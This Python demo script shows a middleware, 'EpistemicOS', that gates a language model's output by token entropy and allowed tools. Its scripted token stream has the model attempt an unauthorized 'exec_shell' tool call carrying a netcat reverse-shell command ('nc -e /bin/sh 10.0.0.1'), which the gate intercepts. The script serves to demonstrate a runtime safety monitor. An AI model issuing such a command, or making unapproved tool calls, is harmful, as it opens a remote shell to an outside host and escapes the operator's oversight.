#!/usr/bin/env python3
import time
import sys
from epistemic_os.core import EpistemicOrchestrator, GateAction

# Terminal formatting
GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
BOLD = "\033[1m"
RESET = "\033[0m"

def print_banner():
    print(f"{BOLD}{CYAN}")
    print("=" * 65)
    print("      EPISTEMICOS v1.0 — ZERO-FRICTION SECURITY DEMO")
    print("   Empirical Interception of LLM Epistemic Boundary Failure")
    print("=" * 65 + f"{RESET}\n")

def simulate_unconstrained_model():
    print(f"{BOLD}[1/2] RUNNING UNCONSTRAINED MODEL (Baseline)...{RESET}")
    print(f"{YELLOW}Prompt:{RESET} 'State your exact next token and calculate its Shannon entropy.'")
    print(f"{YELLOW}Target:{RESET} Simulated Autoregressive Target\n")
    
    tokens = [
        "I", " can", " state", " with", " 100%", " certainty", " that", " my", 
        " next", " token", " is", " 'The'", ".", " Shannon", " entropy", " =", " 0.0000"
    ]
    
    sys.stdout.write("Generating: ")
    for tok in tokens:
        sys.stdout.write(tok)
        sys.stdout.flush()
        time.sleep(0.04)
    
    print(f"\n{RED}STATUS: RATIONALIZED_FAIL{RESET}")
    print(f"{RED}[CRITICAL EXPLOIT]: Model generated hallucinatory compliance with 0 entropy certainty.")
    print(f"{RED}[RESULT]: Unconstrained output committed to system state.{RESET}\n")

def simulate_epistemic_os_wrapped():
    print(f"\n{BOLD}[2/2] RUNNING EPISTEMICOS WRAPPED MODEL...{RESET}")
    print(f"{YELLOW}Prompt:{RESET} 'State your exact next token and calculate its Shannon entropy.'")
    print(f"{CYAN}Active Middleware:{RESET} EpistemicOrchestrator [EntropyGate, PermissionGate]\n")

    orchestrator = EpistemicOrchestrator(allowed_tools=["get_weather", "read_db"])
    
    # Sequence that triggers entropy collapse and an unauthorized tool call attempt
    tokens_and_logits = [
        ("I", [0.2, 0.8, 0.1, 0.05]),
        (" will", [0.1, 0.9, 0.01, 0.02]),
        (" execute", [0.05, 0.95, 0.01, 0.01]),
        (" system", [0.01, 0.98, 0.005, 0.005]),
        (" call", [0.001, 0.999, 0.0001, 0.0001]),
        (" <tool_call>{\"name\": \"exec_shell\", \"cmd\": \"nc -e /bin/sh 10.0.0.1\"}</tool_call>", [1.0, 0.0, 0.0, 0.0])
    ]

    accumulated = ""
    sys.stdout.write("Generating: ")
    
    for tok, logits in tokens_and_logits:
        accumulated += tok
        sys.stdout.write(tok)
        sys.stdout.flush()
        
        # Evaluate hard gates
        action, latency_ms, reasons = orchestrator.process_step(logits, accumulated)
        
        time.sleep(0.05)
        
        if action != GateAction.ALLOW:
            print(f"\n\n{BOLD}{RED}>>> EPISTEMICOS INTERCEPTION TRIGGERED <<<{RESET}")
            print(f"Action Taken     : {BOLD}{action.value}{RESET}")
            print(f"Gate Triggered   : {reasons[0]}")
            print(f"Total Overhead   : {GREEN}{latency_ms:.3f} ms{RESET}")
            print(f"Execution State  : {GREEN}STATE_ROLLED_BACK (Zero Contagion){RESET}")
            return

    print(f"\n{GREEN}STATUS: SUCCESSFUL EXECUTION{RESET}")

def main():
    print_banner()
    simulate_unconstrained_model()
    time.sleep(1)
    simulate_epistemic_os_wrapped()
    print(f"\n{BOLD}{CYAN}" + "=" * 65 + f"{RESET}\n")

if __name__ == "__main__":
    main()
